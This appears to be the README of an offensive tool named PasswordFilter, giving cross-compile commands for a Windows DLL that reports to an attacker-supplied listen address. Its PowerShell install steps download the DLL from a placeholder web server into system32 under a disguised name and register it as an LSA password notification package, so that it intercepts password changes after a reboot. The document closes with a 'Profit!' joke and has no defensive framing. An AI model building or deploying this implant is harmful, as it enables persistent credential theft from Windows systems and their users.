# PasswordFilter

```
Compile:

env GOOS=windows CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -v -x -buildmode=c-archive filter.go
x86_64-w64-mingw32-gcc -c -o "filter.o" filter.c -fPIC -pthread -lwinmm -lntdll -lws2_32 -DSERVER='"<yourlistenip>:<listenport>"'
x86_64-w64-mingw32-gcc -o filter.dll -s -shared filter.o filter.a -fPIC -pthread -lwinmm -lntdll -lws2_32 -DSERVER='<yourlistenip>:<listenport>"'
rm -f filter.o
rm -f filter.h
rm -f filter.a

### Install With

powershell -com "$a=New-Object System.Net.WebClient; $a.DownloadFile('http://<webserver>/filter.dll', 'C:\Windows\system32\idk.dll');"
powershell -con "$b=(Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name 'Notification Packages').'Notification Packages'; Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name 'Notification Packages' -Value ""$b`r`nidk"""
Reboot the box
??
Profit!
```